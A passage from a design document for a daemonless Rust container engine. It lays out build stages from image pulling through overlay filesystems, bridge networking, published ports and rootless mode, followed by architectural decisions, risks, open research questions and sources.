**New concept.** The registry protocol — ping, challenge, token, manifest, index, config, blobs;
the dual-digest model and ChainID; content-addressed storage; and tar extraction against hostile
input.

**Commands.** `pull`, `images`, `rm`/`rmi`, and `run <image>` against an extracted rootfs.

**Explicitly not supported.** Overlay (each image is extracted to a flat directory or to per-layer
diffs on disk), push, zstd layers, schema 1 (detected and **rejected**), the referrers API,
signature verification.

**Success test.** Pull `alpine`, recompute every digest rather than trusting the response header,
extract, and run. Pull the same image from a second registry and confirm the classify-by-response
rule works where the request-based rule would `404`. **The security test is the point of this
stage:** a hand-crafted layer containing `../` traversal, a symlink-swap escape, a device node and a
setuid binary is rejected with a specific error for each, and nothing is written outside the store.

**Major risks.** This is the most dangerous code in the project. A string check on a path is not a
defence against a layer that creates `etc -> /`; resolve through a pinned root handle. Trusting
`Docker-Content-Digest` instead of recomputing. Getting the pipeline order wrong — classify, then
reject schema 1, then verify, then parse; any other order rejects manifests a major registry serves
correctly.

---

### Stage 7 — Layered filesystem

**Goal.** Stop re-extracting. Share layers between containers and give each container a private
writable upper.

**New concept.** OverlayFS — `lowerdir` ordering, `upperdir` and `workdir` constraints, whiteouts in
both their tar and kernel representations, `userxattr`, and supplying layers through individual
`fsconfig` calls.

**Commands.** `run` reuses extracted layers; two containers from one image have independent writes;
`--read-only`.

**Explicitly not supported.** `metacopy`, `redirect_dir`, `volatile`, volumes and bind mounts,
`docker diff`, `commit`, a pluggable storage driver.

**Success test.** Two containers from one image: a file written in one is invisible in the other and
gone when it exits. A whiteout in an upper layer hides a file present in a lower one. A synthetic
image with 300 layers mounts and is fully readable — this is the test that proves the `fsconfig`
path works and that the legacy path's silent truncation has been escaped.

**Major risks.** The 4095-byte options page truncating silently; validate lengths and layer count
**before** the syscall and read the `fs_context` descriptor on failure. `upperdir` and `workdir`
must share a **mount**, not merely a filesystem — a `st_dev` comparison accepts configurations the
kernel rejects. Layers extracted under one extended-attribute mode are not portable to a host using
the other, silently, so the store is partitioned by mode from the first layer written.

---

### Stage 8 — A network namespace of its own

**Goal.** Give the container a private network stack with nothing in it but loopback, and make that
the default.

**New concept.** Network namespace lifecycle; `nsfs` and why a namespace is bind-mounted to keep it
alive; bringing up `lo` over netlink.

**Commands.** `--network=none` (now the default), `--network=host` (now requires an explicit flag
and emits a warning).

**Explicitly not supported.** veth, bridges, NAT, published ports, DNS, container-to-container.

**Success test.** Inside: `ip addr` shows only `lo`, up. A listener bound inside is invisible to the
host's socket listing. The namespace is destroyed when the container exits and the bind mount is
gone. `--network=host` still behaves exactly as in stages 1–7.

**Major risks.** Small stage, one real trap: making `--network=host` the default past this point.
Defaults are the hardest thing to change later, and host networking reaches every host-local
service, including anything trusting `127.0.0.1` and the cloud metadata address.

---

### Stage 9 — Bridge, NAT, and the outside world

**Goal.** The first genuinely useful network: containers reach the internet and each other.

**New concept.** veth pairs created over rtnetlink with the peer placed directly into the target
namespace in one message; a bridge and what its forwarding database does for us; source NAT;
and — folded in rather than deferred — generating `/etc/resolv.conf` and `/etc/hosts`.

**Commands.** `--network=bridge` (default), container-to-container by address.

**Explicitly not supported.** Published ports, name resolution between containers, IPv6, custom
networks, `--link`.

**Success test.** **Two containers ping each other by address** — this is the criterion that is
satisfiable with only this stage's work. Then `apk add curl` succeeds, which requires the
`resolv.conf` generation this stage includes.

**Corrected ordering.** The obvious version of this stage puts DNS later and tests with
`apk add curl`. That fails: a container with an address, a route and working NAT has **no
nameserver at all**, so the stage looks broken in a way every user misdiagnoses as "networking is
broken". The thirty lines of `resolv.conf` and `/etc/hosts` generation are a *prerequisite* of this
stage, not a successor to it.

**Worth one afternoon, then delete it.** Build veth-to-host with manual routing first, as an
experiment rather than a shipped mode, and price it: a host route per container, `proxy_arp` or a
link-scoped route for ARP to resolve at all, and O(n²) host routes for container-to-container. The
bridge replaces all of it with one `IFLA_MASTER` and one kernel-generated route. **The bridge is not
an optimisation over manual routing; it is less work than manual routing** — and that is not obvious
until manual routing has been built once.

**Major risks.** This stage creates the largest irreversible host mutation in the project: a bridge
holding an address and an on-link route, which reserves a subnet as far as any future allocator is
concerned, and which is the exact object observed leaked on a production host. Detect
`ip_forward = 0` and fail with the command to fix it rather than writing it — that removes this
stage's worst mutation entirely.

---

### Stage 10 — Published ports

**Goal.** The container becomes a service reachable from outside the host.

**New concept.** Destination NAT; the three rules a single published port actually needs; the
userland proxy helper and the cases NAT cannot serve; atomic firewall transactions.

**Commands.** `-p 8080:80`, `-p 127.0.0.1:8080:80`.

**Explicitly not supported.** Published UDP ranges, IPv6 publishing, `--icc` control, hairpin NAT
beyond the single documented rule.

**Success test.** `curl <host-ip>:8080` succeeds **from the host and from another machine**; an
unpublished port is refused; `-p 127.0.0.1:8080:80` is reachable only from the host.

**Corrected ordering.** The obvious test — `curl localhost:8080` — cannot pass with rules alone.
Loopback is **deliberately excluded from destination NAT**, so either the userland helper is part of
this stage's definition or the test must use the host's routable address. This ladder includes the
helper, because it is the same code the IPv6 case needs anyway.

**Major risks.** This is the highest-rate mutation in the project and the only stage where partial
state is a **security hole** rather than a failure: DNAT without the corresponding filter accept
merely does not work, whereas a filter accept without the anti-spoof rule opens the container to
anyone who can route to its address. **Do not start this stage before atomic firewall transactions
work** — implementing it one rule at a time means shipping a known hole with a crash as its trigger.
And the unresolved foreign-policy question (§1.11, §11.5) blocks this stage on hosts with a
pre-existing DROP policy; settle it first.

---

### Stage 11 — Single-ID rootless

**Goal.** Run without root, and in doing so prove that the privilege seam held.

**New concept.** User namespaces and ID mapping; what root-inside-a-namespace genuinely cannot do;
honest degradation when a facility is simply absent.

**Commands.** Everything from stages 1–9 as an unprivileged user, with limits and networking
degrading explicitly and loudly.

**Explicitly not supported.** `subuid`-based multi-ID mapping and the setuid helpers, rootless
published ports below 1024, `fuse-overlayfs`.

**Success test.** An unprivileged user runs a container and gets a correct rootfs, namespaces and
seccomp. Where a facility is unavailable — no writable cgroup, no bridge-to-host path — the engine
says so explicitly and names what is degraded. Nothing in stages 1–10 changed shape to make this
work: if this stage required a topology change, the seam was in the wrong place and that is the
finding.

**Why this is reachable without a rewrite.** A process **can** write a single-extent user-namespace
map of its own effective uid, with no helper and no intermediate process. The three-process topology
rootless is assumed to require applies only to `subuid`-based or multi-extent maps. The entire
bridge-and-NAT model also works inside a rootless namespace, on a kernel as old as 4.18 — the gate
is `CAP_NET_ADMIN` in the **user namespace owning the target namespace**, not in the host's.

**Major risks.** Not the stage itself — the ten before it. If privilege was expressed as "we are
root, so this will work" rather than as "this operation, in this namespace, needs this capability",
the assumption is now in hundreds of places that never mention uid, and this stage is a rewrite
rather than an addition. That is why the seam is a **DECIDE NOW** item (§18.6) despite rootless
being last.

---

### What the ladder deliberately never reaches

Stated so that a planning session does not read the end of the list as the end of the project:
`exec` and `attach`, restart policies, `events`, volumes and bind mounts, `commit` and `build`,
push, a daemon or HTTP API, Compose-shaped multi-container orchestration, checkpoint/restore, and
drop-in OCI runtime compatibility. Each is additive given the eleven stages above — §19 records why
for each — and none belongs in a first implementation whose purpose is understanding the mechanisms.

---

## 18. Decisions we should make now

A decision belongs here when **changing it later means rewriting code that is not obviously
related to it.** Everything else belongs in §19. Each entry states the decision, the evidence,
and the cost of reversing it.

### 18.1 Daemonless. One binary, several subcommands.

**Recommendation.** No background service. `mydocker` is a single executable; `run`, `ps`,
`stop`, `rm`, `images`, `pull` are subcommands of it.

**Why this is a now-decision.** Docker's daemon exists to serve a remote API, to own image and
network state shared between invocations, to apply restart policies, and to keep a container's
I/O attached after the client detaches. Only the last of those is forced by the kernel, and a
per-container supervisor process solves it without a daemon — which is how Podman works.

Adding a daemon later is cheap **provided the supervisor already owns the container and all
state is on disk in a documented layout.** The reverse is not: a design where the daemon owns
the containers cannot have the daemon removed, because process ancestry is not refactorable.

**Cost of reversal.** Low in the chosen direction, total in the other.

### 18.2 The CLI must never be in the container's process ancestry.

**Recommendation.** `mydocker run` forks a supervisor and exits. The supervisor — not the CLI —
is the container's parent.

**Why this is a now-decision.** This single structural fact determines whether detach, `ps`
after the CLI exits, exit-code collection, restart policies and attach/exec are *features* or
*rewrites*. If the CLI is the parent, every one of them requires changing the process topology,
and the process topology is the one thing in a container runtime that cannot be changed
incrementally.

**Cost of reversal.** Total. This is the most expensive wrong decision available in the project.

### 18.3 Sync internals in the create path. Async confined behind a boundary.

**Recommendation.** The process that calls `clone3` is single-threaded and stays that way. No
async runtime, no thread pool, no lazily-initialised global that might spawn one, anywhere in
the create path. Async — if used at all — lives in the registry client, in a separate process or
behind a boundary crossed only by completed data.

**Why this is a now-decision.** Threads cannot be un-spawned. Several namespace operations
require a single-threaded caller, and a multi-threaded process is also what forces runc's
two-stage re-exec design. Retrofitting sync into an async codebase is a rewrite of every call
path, not a refactor.

**Trap.** This constrains *dependencies*, not just our code. A crate can introduce a thread pool
transitively — the obvious cgroups crate does exactly this, pulling in a D-Bus client whose
default features include a blocking thread pool. The dependency graph of the core crate must be
audited for executors, not just reviewed for API.

**Cost of reversal.** Very high.

### 18.4 Image handling is a separate subsystem from container execution.

**Recommendation.** Two subsystems with one narrow interface. Pull and unpack produce a
content-addressed store and a materialised rootfs; the runtime consumes a bundle (a rootfs path
plus a config). Neither calls into the other.

**Why this is a now-decision.** Coupling them is the default outcome of writing `run` first,
and it is very hard to undo: you end up unable to pull without running, unable to run without
pulling, and unable to test either in isolation. The boundary also happens to be where OCI
compatibility lives, so a blurred boundary means the compatibility story blurs with it.

**Cost of reversal.** High — it is a decomposition, touching everything.

### 18.5 cgroup v2 only. Detect v1 and refuse with a clear message.

**Recommendation.** Target the unified hierarchy. On a v1 or hybrid host, detect it and fail
with an explanation, rather than silently running without limits.

**Why this is a now-decision.** v1 is not a flag or a compatibility shim — it is a second
implementation with a different hierarchy model, different files, different semantics for the
same options, and a different security posture (one known container escape exists only on v1).
Writing both from the start doubles the surface for no educational return; writing v1 *later*
behind a trait is possible, which is why the decision is "v2 only", not "v2 forever".

**Trap.** "Detect and degrade to no limits" is worse than refusing. A container that silently
has no memory limit is a lie told to the operator, and one of our own test hosts has no writable
cgroup at all — so this path will be exercised.

**Cost of reversal.** Moderate, and bounded if limit-writing sits behind one interface.

### 18.6 Root required at MVP — and name the rootless seam now.

**Recommendation.** The MVP requires root. But the single abstraction that makes rootless a
later addition rather than a rewrite is identified and respected from the first commit: every
privileged operation is expressed as *"this operation, in this namespace, requires this
capability"* rather than as *"we are root, so this will work."*

**Why this is a now-decision.** Not because rootless is urgent, but because the *assumption*
spreads. Code that assumes root does not announce itself; it simply omits the error path. By the
time rootless is wanted, the assumption is in hundreds of places that never mention uid.

**New evidence that makes this cheaper than assumed.** A process can write a single-extent
user-namespace map of its own effective uid without any helper and without an intermediate
process. The three-process topology that rootless was thought to require applies only to
subuid-based or multi-extent maps. Single-ID rootless is therefore reachable without changing
the process architecture — which is precisely the seam worth protecting.

**Cost of reversal.** High and diffuse — the worst shape of cost, because it is invisible until
it is enormous.

### 18.7 The minimum kernel version is an architectural decision, not an assumption.

**Recommendation.** Set the primary target at **6.7 or later** and document what is lost below
it, rather than silently supporting whatever the developer's machine runs.

**Why this is a now-decision.** It changes the storage design. Mounting a many-layer image
through the legacy `mount(2)` interface is limited to a 4095-byte options page that **truncates
silently**; `mount -o lowerdir+=` does not escape it. Genuine `fsconfig(2)` calls do escape it —
measured with 300 layers mounted and readable — and that capability arrived in 6.7. Above that
line we mount layered images directly. Below it we must reimplement overlay2's short-symlink
indirection, which is a meaningful amount of code existing solely to fit inside a page.

Secondary floors to record alongside it: unprivileged overlay in a user namespace and
`CLOSE_RANGE_CLOEXEC` are both 5.11, and the resource-control feature set resolves to 5.15.

**Trap.** A flag's kernel version is not its syscall's kernel version. `close_range` the syscall
is 5.9; the `CLOSE_RANGE_CLOEXEC` flag is 5.11. Probing the syscall and concluding the flag is
available is an error this research already made once.

**Cost of reversal.** Raising the floor later is free. Lowering it later is a storage rewrite.

### 18.8 Target runtime-spec 1.3.0. Accept any SemVer major 1. Never reject on version.

**Recommendation.** Write `ociVersion: "1.3.0"`, accept anything matching major 1 on read, and
never fail a bundle because of its version string.

**Why this is a now-decision.** It decides which semantics we implement — and one of them is a
MUST-level behavioural difference: as of 1.3.0 a failing `poststart` hook must stop the
container, where previously it was logged and ignored.

**Convention.** The version field is effectively unvalidated across the ecosystem. runc
overwrites it with its own constant during spec conversion; crun hardcodes `"1.0.0"`; the
bundles produced by a current Docker declare a different version than the runc executing them
reports. Strict version checking would therefore reject working bundles produced by the
reference implementation.

**Cost of reversal.** Low. Listed here because it is cheap to get right and surprisingly
expensive to discover late.

### 18.9 Define kernel constants ourselves. Deny deprecated items.

**Recommendation.** Kernel flag values used in the create path are defined in our own code with
the correct width, not imported from a binding crate, and the crate is compiled with deprecated
items denied.

**Why this is a now-decision.** This is a general rule derived from a specific, confirmed defect:
`CLONE_INTO_CGROUP` is exposed by the standard libc binding as a type too narrow to hold its
value, so it **truncates to zero**, and is absent entirely on musl. The clone then succeeds,
reports no error, and places the child in the *parent's* cgroup. Every resource limit appears to
be configured and none of them apply.

A constant that is silently zero is the worst available failure shape: no error, no log, no
symptom until production. The defence is structural and costs nothing if adopted on day one.

**Cost of reversal.** Low to adopt later, but the bug it prevents can live undetected for the
entire life of the project.

### 18.10 Seal `/proc/self/exe` on the first line of `main()`.

**Recommendation.** Re-execute from a sealed memory file descriptor at startup, before anything
else.

**Convention.** All three mature runtimes do this — runc, crun (via a C constructor) and youki —
against the CVE-2019-5736 class, in which a container overwrites the runtime binary through
`/proc/self/exe`.

**Trap.** "We will design so that we never re-execute into the container, which eliminates the
whole CVE class" is false, and it is a tempting line of reasoning. crun *does* re-execute, and
the mitigation is present in all three regardless of design.

**Cost of reversal.** Low to add, but it is a container escape, and the whole point of the
exercise is understanding why the mitigation exists.

### 18.11 Runtime state: fix the shape and the locking now, defer the schema.

**Recommendation.** One directory per container id, holding a state file, a lock file and the
start rendezvous FIFO. The **schema** inside the state file is deferred; the **shape** and the
locking discipline are not.

**Why this is a now-decision.** Two defects in the obvious implementation are not discoverable by
testing the happy path:

- The lock file must be opened `O_CLOEXEC`. A `flock` is released only when *every* inherited
  duplicate is closed, so a CLI that takes the lock and then forks a supervisor has not released
  anything when it exits — the supervisor holds it for the container's entire life, and every
  later `start`, `kill` or `rm` on that container blocks forever.
- `start` must not block on the rendezvous FIFO while holding that lock. If the container's init
  died between `create` and `start`, no writer will ever appear, and the command wedges
  permanently *while holding the lock*, taking `kill` and `delete` down with it. Open the FIFO
  non-blocking and poll it alongside a process descriptor for the init process.

**Cost of reversal.** Low for the schema, high for the shape — the locking discipline is
assumed by every subcommand.

---

## 19. Decisions we should deliberately postpone

Listed with **why deferral is safe**, because "we'll do it later" is only a plan when the later
cost is known. The common property: each is additive behind an interface that already exists, or
is pure data layout over content-addressed storage.

| Decision | Why deferring is safe | What must be true now |
|---|---|---|
| **Metadata serialisation schema** | JSON over a documented directory layout; a schema change is a migration, not a rewrite | The *location* and the locking discipline are fixed (§18.11) |
| **Image store directory layout, GC algorithm** | Content-addressed storage means layout is an index over immutable blobs; it can be rebuilt by rescanning | Blobs keyed by digest; the compressed-digest / `diff_id` distinction honoured from the start |
| **Registry push** | Strictly additive; shares the auth and transport code that pull already needs | Nothing |
| **zstd layers** | A second decompressor behind the same interface; the evidence that anyone serves them is still thin | Media type is read from the descriptor, never assumed |
| **Embedded DNS** | A namespace-local listener added later; nothing structural depends on it | Containers can reach the host resolver meanwhile |
| **Restart policies, `events`, `logs --follow`** | All are supervisor features, and the supervisor already exists and already outlives the CLI | §18.2 holds |
| **Multi-container supervisor (pods)** | A supervisor that owns several containers is a generalisation of one that owns one | Container identity is not implicit in the supervisor's identity |
| **Drop-in OCI runtime CLI (`create`/`start`/`kill`/`delete`/`state`)** | A second front-end over the same core; the lifecycle it needs is already the lifecycle we implement | The lifecycle states are modelled explicitly, not implied by process existence |
| **AppArmor / SELinux profiles** | Host-dependent and orthogonal to our mechanisms | The security posture is labelled honestly meanwhile (§20.3) |
| **Landlock** | Unprivileged and self-contained; genuinely additive | Noted as the one LSM a rootless engine can use |
| **cgroup v1** | A second backend behind the limit-writing interface | Limit writing sits behind one interface (§18.5) |
| **Checkpoint/restore, Windows, VM isolation** | Different projects wearing our name | Nothing |

---

## 20. Architectural risks

### 20.1 The silent-zero class

The most dangerous failures found in this research share a shape: **the operation succeeds and
the guarantee is absent.** A truncated clone flag that places the child in the wrong cgroup with
no error. A mount options page silently truncated at 4095 bytes, with the mount returning
success. A capability bounding-set drop that returns `EPERM` for a non-root container user *and
silently succeeds for `USER root`*, so it passes every smoke test run against a stock image. An
OOM counter that also counts host-pressure kills, so the engine reports a cause it did not
observe.

None of these are caught by "does `mydocker run alpine echo hello` work?" The mitigation is
specific and must be designed in, not added: **every isolation guarantee is asserted after it is
established, from inside the container, by reading back what the kernel says.** An integration
test that checks the output of `echo hello` tests nothing about isolation.

### 20.2 Findings measured on two atypical hosts

The empirical backbone of this research is two machines: a production droplet on kernel 6.11 and
an HPC login node on RHEL's 4.18. Neither is a normal development target, neither could be
mutated freely, and the Docker on the observed host is now several minor versions behind current.
At least one significant conclusion was already wrong for this reason — the firewall backend
picture was inferred from an un-upgraded host and missed an upstream release ten months old.

**This is the single largest process risk, and it has a cheap fix that has not been applied yet:
a local, destroyable Linux VM does not exist.** Several findings are explicitly flagged
"unverifiable here" with the exact command that would settle them. Until that VM exists, the
rate at which this corpus silently decays is higher than it looks.

### 20.3 The MVP's security posture will be mislabelled

The tempting claim is that an MVP which skips user namespaces is "no worse than Docker, which
also doesn't use them by default." This is false, and believing it is the risk.

Docker's permissive user-namespace default is survivable **because capabilities are dropped,
seccomp is applied, and an LSM profile is loaded.** An MVP that defers all three is not in
Docker's position; it is running a process as real root with a different filesystem view. That is
a legitimate stage to pass through — it is where the learning is — but it must be labelled as
process isolation with no security boundary, in the documentation and in the program's own
output, rather than compared favourably to a system whose other three defences are intact.

### 20.4 The verification corpus is itself a dependency

Eleven thousand lines of adversarial verification corrected a great deal, and those corrections
are now load-bearing. But a verifier's finding is a claim like any other. Several are explicitly
source-derived rather than measured — including the cgroup-namespace ordering defect, which is
the only finding that blocks the MVP's creation sequence and which was read out of kernel source
rather than observed. Each such finding names the test that confirms it; those tests are not
optional, and the ones that gate the creation sequence should be run before the sequence is
written, not after it misbehaves.

### 20.5 Host state outliving the process

The engine creates host state that survives its own crash: bridges, virtual interfaces,
addresses, routes, firewall rules and sets, namespace bind mounts, address allocations, and
mounts. Some of it self-heals — our own tables can be flushed and rebuilt. Some of it does not:
a rule written into a *shared built-in* chain can only be removed by exact match from a record we
kept, and if the record is gone the rule is permanent.

This is not hypothetical. An orphaned bridge with live NAT rules and no owning network was found
on the production host during this research, and it is still there. Reconciliation on startup is
therefore a first-class feature, not cleanup polish — and the cleanup order matters: **rules
before devices**, because removing a bridge first re-opens its subnet for allocation while
leaving behind a masquerade rule that can never match again.

### 20.6 The foreign firewall policy problem is unsolved

On a host whose forward policy is DROP — a stock `ufw` Ubuntu machine, among others — a packet
cannot be rescued by an `accept` in our own nftables table at any priority, because `accept`
terminates only the current base chain. A purely native-nftables engine gives containers no
network on such a host, **silently**. The options are to detect and refuse, or to write one
marked rule into the foreign chain and sweep it during reconciliation. This needs a decision
before networking code is written, and it is the one open question in this document that blocks a
specific stage of the ladder rather than merely adding risk to it.

### 20.7 Ceilings that are invisible until reached

Three limits sit far enough away to be ignored at MVP and are expensive to discover late. The
seccomp filter builder we recommend expresses one architecture, while a Docker-equivalent profile
covers three — reaching that point means replacing the filter builder. Overlay layer stacking
ends at 500. And layers extracted under one extended-attribute mode are **not portable** to a
host using the other, silently — which only shows up when an image is built on one machine and
run on another.

---

## 21. Open research questions

Grouped by what it would take to close them. Every item names its settling test, because a question
without one is a worry rather than a question.

### 21.1 Blocked on a local destroyable Linux VM — which does not exist yet

**This is the single cheapest unblocking action available to the project.** The research ran against
two machines, neither suitable: a production host that could only be read, and a rootless HPC login
node on an old kernel. Everything below is cheap, fast, and currently impossible.

| Question | Why it matters | The test |
|---|---|---|
| Does placing the child into its cgroup at clone time while also creating a cgroup namespace really give the container *our* subtree? | **The only finding that blocks the MVP creation sequence.** Derived from kernel source, not measured | Clone with both, then read `/proc/self/cgroup` from inside and compare against the intended path |
| Is the capability bounding-set drop after a uid change genuinely `EPERM`? | Two verification passes disagree — see §21.2 | Container with `USER 1000`, drop bounding after the uid change, expect `EPERM`; repeat with `USER root` and observe it succeed |
| Does the truncated clone constant actually place the child in the parent's cgroup? | The constant is *proven* zero; the behavioural consequence is inferred | Clone with the libc constant, read `/proc/self/cgroup` from inside |
| Does a volume bind from a shared host mount land shared inside the container? | Decides whether `rslave` and `rprivate` differ for us at all | Bind a shared host mount in, create a mount under it inside, check host `mountinfo` |
| Does any `rustix` call in the child subset allocate? | The no-allocation property is verified for path arguments only, spot-checked elsewhere | A `#[global_allocator]` counting shim across the child's setup steps — **with a ≥256-byte rootfs path**, or it proves nothing |
| Does `rustix::thread::set_thread_*` give the `execve`d program the right ids? | Load-bearing for the whole "rustix, not nix" decision, and cheap | Drop to a non-root uid in the child, assert `getuid`/`geteuid`/`getgroups` in the executed program. **Run this first** |
| Does a static `x86_64-unknown-linux-musl` build work on stable? | Determined from build requirements, not run | `cargo build --target x86_64-unknown-linux-musl --release` then `ldd`, expecting "not a dynamic executable" |
| Three source-read kernel behaviours: `clone3` rejecting an exit signal in the flags word; the `clone3` struct size floor for cgroup placement; the logging-sink deadlock after fork | Each is cheap and each underpins a recommendation | Named in place in §15.2, §15.3, §15.6.3 |
| Does bridge hairpin become necessary with `br_netfilter` loaded and the per-bridge flag set? | The five-configuration matrix ran with the bridge sysctl path absent | `modprobe br_netfilter`, set `bridge-nf-call-iptables` and the per-bridge flag, re-run the five configurations |
| Is `CONFIG_X86_X32_ABI` enabled on our target kernels? | Decides whether the seccomp bypass is live or inert — the recommendation is correct either way | Check the kernel config on each target |
| What is the real instruction count of our seccomp filter? | The binding limit is the 255-byte jump offset, not the instruction cap, and nobody has counted | Assemble the profile and count |
| How do `memory.max` and `memory.high` actually behave under genuine allocation pressure? | Decides whether we set `memory.high` at all | A real allocator against each, separately |
| Is an MVP with no writable cgroup useful enough to ship as a mode? | The tier behaviour is decided; the product question is not | Run the degraded tier and judge |

### 21.2 Disagreements between verification passes, not yet settled

**The capability ordering.** One pass classifies "drop the bounding set before the uid change" as
convention; another classifies it as kernel-enforced. This document states it as kernel-enforced,
because that side cites `PR_CAPBSET_DROP` returning `EPERM` without effective `CAP_SETPCAP` together
with the explicit statement in `capabilities(7)` that effective capabilities are cleared even with
`SECBIT_KEEP_CAPS`, while the "convention" reading rests only on bounding drops being irreversible
either way — which is true and beside the point. Settled by the test in §21.1.

**`CAP_NET_BIND_SERVICE` in the strict capability set.** Two sources disagree on whether it can be
dropped given `ip_unprivileged_port_start = 0`. Currently resolved by making the drop conditional on
a private network namespace. Worth a second opinion rather than a test.

**The firewall backend crate.** One pass weighs a JSON-over-`nft(8)` crate in; another points out it
is not a netlink library at all and makes an external binary a runtime dependency. Resolved here by
putting it behind a trait so the choice stays reversible, which is a deferral rather than an answer.

### 21.3 Needs an environment nobody had

| Question | What is needed |
|---|---|
| Can a non-parent read a truthful exit code via the newer process-descriptor interface? | A host on kernel 6.15 or later; the observed host was 6.11 |
| What are Docker 29's numeric nftables base-chain priorities? | A host running 29.x with the nftables firewall backend. Its documentation says only "well known values", and we must place our chains relative to them |
| Does any major registry actually serve zstd layers? | Seven images across three registries were all gzip — a sample, not a census. Settling it properly requires a **push**, which is out of MVP scope |
| What errno does an NFS `upperdir` really return? | No NFS mount existed on any verification host |

### 21.4 Genuinely unresolved, needing a decision rather than a measurement

- **The foreign `FORWARD` policy question** (§1.11, §11.5). Detect and refuse, or write one marked
  rule into a chain we do not own. This blocks stage 10 and is the only open item in this document
  that blocks a specific ladder stage.
- **Whether the engine ever claims security isolation in its documentation** (§1.12). A
  one-paragraph honesty decision that cannot be retrofitted once users rely on it.
- **`no_new_privs` unconditionally, or with an escape hatch.** One seccomp code path or two,
  forever.

### 21.5 Known decay

Every observation in this corpus about Docker's behaviour was measured on a host that is now several
minor versions behind current, and one significant conclusion was already wrong for exactly this
reason — the firewall backend picture missed an upstream release ten months old. Treat any
convention-tagged claim about Docker as needing a re-check before it is relied upon, and prefer the
fact-tagged and specification-tagged claims, which do not decay the same way.

---

## 22. Source index

Sources are listed by class with their canonical locations. **Per-claim pinned citations —
repository, commit, file and line — live in the research corpus** under `research/`, in the five
domain files `D1`–`D5` and the seven verification files `V1`–`V7`. This document cites primary
sources inline; the corpus is where the provenance of a specific sentence is recoverable.

### 22.1 Linux kernel

- **Manual pages**, `https://man7.org/linux/man-pages/` — `namespaces(7)`, `mount_namespaces(7)`,
  `pid_namespaces(7)`, `user_namespaces(7)`, `capabilities(7)`, `credentials(7)`,
  `signal-safety(7)`, `unix(7)`, `pipe(7)`; and `clone(2)`, `clone3(2)`, `unshare(2)`, `setns(2)`,
  `mount(2)`, `umount2(2)`, `mount_setattr(2)`, `fsopen(2)`, `fsconfig(2)`, `fsmount(2)`,
  `move_mount(2)`, `open_tree(2)`, `openat2(2)`, `pivot_root(2)`, `prctl(2)`, `seccomp(2)`,
  `close_range(2)`, `pidfd_open(2)`, `pidfd_send_signal(2)`, `waitid(2)`, `flock(2)`, `execve(2)`,
  `mknod(2)`, `statx(2)`, `proc(5)`.
- **Kernel tree documentation** — `Documentation/admin-guide/cgroup-v2.rst`,
  `Documentation/filesystems/overlayfs.rst`, `Documentation/filesystems/proc.rst`,
  `Documentation/userspace-api/landlock.rst`, `Documentation/networking/`.
- **Kernel source**, read at pinned versions (v6.11 and v6.17 principally) — `kernel/fork.c`,
  `kernel/exit.c`, `kernel/cgroup/namespace.c`, `kernel/user_namespace.c`, `fs/namespace.c`,
  `fs/overlayfs/`, `fs/proc/`, `security/commoncap.c`.

### 22.2 OCI specifications

- **Runtime Spec** — `https://github.com/opencontainers/runtime-spec`, `runtime.md`, `config.md`,
  `config-linux.md`, `features-linux.md`. Current release **v1.3.0** (2025-11-04).
- **Image Spec** — `https://github.com/opencontainers/image-spec`, `spec.md`, `manifest.md`,
  `image-index.md`, `config.md` (including the normative ChainID derivation), `layer.md`,
  `descriptor.md`. Current release **v1.1.1**.
- **Distribution Spec** — `https://github.com/opencontainers/distribution-spec`, `spec.md`, and
  `content-negotiation.md`, **which is a `TODO` stub** and is the reason §9.4 exists.
- **Conformance** — `opencontainers/runtime-tools` `validation/` (the only external grader that
  applies to a runtime; pin by commit, as its last tag long predates its commits);
  `opencontainers/distribution-spec` `conformance/`. `image-tools` is **archived**.

### 22.3 Reference runtimes and engines

Read at pinned tags, not at `main`:

- **runc** — `https://github.com/opencontainers/runc`: `libcontainer/` (`container_linux.go`,
  `process_linux.go`, `standard_init_linux.go`, `init_linux.go`, `console_linux.go`,
  `state_linux.go`, `specconv/spec_linux.go`), `libcontainer/nsenter/nsexec.c`, `docs/terminals.md`.
- **crun** — `https://github.com/containers/crun`: `src/libcrun/container.c`, `src/libcrun/linux.c`.
- **youki** — `https://github.com/youki-dev/youki`: `crates/libcontainer/`, `crates/libcgroups/`,
  `crates/liboci-cli/`, `crates/youki/src/main.rs`.
- **containerd** — `https://github.com/containerd/containerd`: `docs/runtime-v2.md`,
  `core/metadata/`, the content store and snapshotter interfaces, `platforms/`.
- **moby / Docker** — `https://github.com/moby/moby`: `daemon/`, `daemon/libnetwork/`,
  `api/pkg/stdcopy/`, `go-archive`, and the default seccomp profile.
- **Podman, conmon, CRI-O** — `containers/podman`, `containers/conmon` (`src/conmon.c`),
  `cri-o/cri-o`.
- **netavark** — `https://github.com/containers/netavark`, for the nftables transition.
- **Others consulted for one idea each** — gVisor, Kata, Firecracker's jailer, Apptainer.

### 22.4 Security advisories

- **CVE** records for the container-escape classes in §13.7, principally CVE-2019-5736,
  CVE-2019-14271, CVE-2022-0492, CVE-2024-21626, the 2025 runc set (CVE-2025-31133,
  CVE-2025-52881, CVE-2025-52565), and the 2026 set (moby CVE-2026-17106 and
  CVE-2026-41567/CVE-2026-42306, runc CVE-2026-41579, crun CVE-2026-88264/CVE-2026-88265,
  containerd CVE-2026-95838).
- **RUSTSEC advisory database** — `https://github.com/RustSec/advisory-db`, for every crate in the
  recommended dependency set; the version floors in §15.7 come from it.

### 22.5 Rust crates

Read as **source**, downloaded from `static.crates.io` and extracted, not as documentation:
`rustix`, `nix`, `libc`, `oci-spec`, `caps`, `seccompiler`, `libseccomp`, `cgroups-rs`, `tar`,
`flate2`, `zstd`, `sha2`, `netlink-sys`, `netlink-packet-route`, `rtnetlink`, `nftables`,
`pentacle`, `memfd`, `pathrs`, `safe-path`, `procfs`, `tracing-subscriber`.

Crate metadata and repository activity from the crates.io API and the GitHub API. **Operational
note for any future agent:** the crates.io JSON API returns HTTP 403 without a `User-Agent` header;
`static.crates.io` does not.

### 22.6 Empirical observation

Two hosts, both described in `research/README.md`, neither a suitable development target:

- **A production host** — Ubuntu 24.10, kernel 6.11.0-29, root, cgroup v2 fully delegated, native
  overlay, `iptables-nft` and `nft`, AppArmor on, Docker 28.3.1 / containerd 1.7.27 / runc 1.2.5,
  **serving live public traffic**. Observed read-only throughout; experiments confined to private
  user and mount namespaces under `/tmp` and cleaned up. No container, image, firewall rule, cgroup
  file or configuration file was modified.
- **An HPC login node** — Rocky 8.8, kernel 4.18 with RHEL backports, **no root**, cgroup v1 with no
  delegation, no `subuid` entries, NFS home. Used as the degradation probe for rootless, old-kernel
  and no-delegation behaviour.

Registry behaviour was probed from a macOS workstation against five registry backends.

**The gap this leaves** is recorded in §20.2 and §21.1: there is no destroyable Linux VM, and a
